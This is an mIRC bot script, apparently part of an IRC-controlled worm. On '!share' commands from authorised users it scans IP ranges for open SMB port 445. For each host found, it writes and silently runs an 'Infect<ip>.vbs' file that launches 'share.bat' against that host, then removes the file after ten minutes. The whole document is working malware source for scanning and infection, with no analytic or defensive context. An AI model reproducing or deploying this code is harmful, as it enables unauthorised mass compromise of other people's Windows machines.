on *:text:!share*:*:{
  if ($2 == stop) && ($address isin %access) {
    timerNTServerScan* Off
    sockclose NTServerScan*
     cm Share Scan Stopped
    halt
  }
  if ($2 == status) && ($address isin %access) {
    if ($timer(NTServerScan0) == $null) {
      cm Share Script Unactive
      halt
    }
    if ($timer(NTServerScan0) != $null) && ($address isin %access) {
      if ($lines(ntserver.vxd) == $null) {
        if (%skill == $null) { set %skill 0 }
        cm Share Scan (Range) $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp) (Current) $longip(%NTServerScanCurrentIp) (Sockets Open) $sock(NTServerScan*,*) (Found) %skill
        halt
      }
    }
  }
  if ($2 == resume) && ($address isin %access) && ($address isin %access) {
    if (%NTServerScanStartIp == $null) {
      cm Share Scan (Error) Cannot Resume
      halt
    }
    if (%NTServerScanCurrentIp == $null) {
     cm Share Scan (Error) Cannot Resume
      halt
    }
    if (%NTServerScanEndIp == $null) {
      cm Share Scan (Error) Cannot Resume
      halt
    }
    if (%NTServerScanCurrentIp == %NTServerScanEndIp) {
      cm Share Scan (Error) Scan Complete
      halt
    }
    cm Share Scan in Progress (Range) $longip(%NTServerScanCurrentIP) -> $longip(%NTServerScanEndIP)
    timerNTServerScan0 -o 0 5 NTServerScan
    timerNTServerScan1 -o 0 5 NTServerScan
    timerNTServerScan2 -o 0 5 NTServerScan
    timerNTServerScan3 -o 0 5 NTServerScan
    timerNTServerScan4 -o 0 5 NTServerScan
    timerNTServerScan5 -o 0 5 NTServerScan
    timerNTServerScan6 -o 0 5 NTServerScan
    timerNTServerScan7 -o 0 5 NTServerScan
    timerNTServerScan8 -o 0 5 NTServerScan
    timerNTServerScan9 -o 0 5 NTServerScan
    timerNTServerScan10 -o 0 5 NTServerScan
    timerNTServerScan11 -o 0 5 NTServerScan
    timerNTServerScan12 -o 0 5 NTServerScan
  }
  if ($2 == start) && ($address isin %access) {
    unset %skill
    set %NTServerScanStartIp $3
    set %NTServerScanCurrentIp $3
    set %NTServerScanEndIp $4
    timerNTServerScan0 -o 0 5 NTServerScan
    timerNTServerScan1 -o 0 5 NTServerScan
    timerNTServerScan2 -o 0 5 NTServerScan
    timerNTServerScan3 -o 0 5 NTServerScan
    timerNTServerScan4 -o 0 5 NTServerScan
    timerNTServerScan5 -o 0 5 NTServerScan
    timerNTServerScan6 -o 0 5 NTServerScan
    timerNTServerScan7 -o 0 5 NTServerScan
    timerNTServerScan8 -o 0 5 NTServerScan
    timerNTServerScan9 -o 0 5 NTServerScan
    timerNTServerScan10 -o 0 5 NTServerScan
    timerNTServerScan11 -o 0 5 NTServerScan
    timerNTServerScan12 -o 0 5 NTServerScan
    cm Share Scan in Progress (Range) $longip($3) -> $longip($4)
  }
}

alias NTServerScan {
  if (%NTServerScanCurrentIP == %NTServerScanEndIp) {
    cm Share Scan Complete (Range) $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp)
    sockclose NTServerScan*
    timerNTServerScan* Off
    halt
  }
  if (%NTServerScanCurrentIP != %NTServerScanEndIp) {
    inc %NTServerScanCurrentIp 1
    sockopen NTServerScan $+ %NTServerScanCurrentIp $longip(%NTServerScanCurrentIp) 445
    halt
  }
}
on *:sockopen:NTServerScan*:{
  if ($sockerr) {
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockclose $sockname
    halt
  }
  inc %skill
  cm Share Scan Found (Amount) %skill
  write Infect $+ $sock($sockname).ip $+ .vbs on error resume next
  write Infect $+ $sock($sockname).ip $+ .vbs Set fso = CreateObject("Scripting.FileSystemObject")
  write Infect $+ $sock($sockname).ip $+ .vbs windows = fso.GetSpecialFolder(WindowsFolder)
  write Infect $+ $sock($sockname).ip $+ .vbs Set src3 = CreateObject("Wscript.shell")
  write Infect $+ $sock($sockname).ip $+ .vbs src3.run "share.bat $sock($sockname).ip $+ ",0,true
  timer 1 600 remove Infect $+ $sock($sockname).ip $+ .vbs
  run Infect $+ $sock($sockname).ip $+ .vbs
  sockclose $sockname
} }
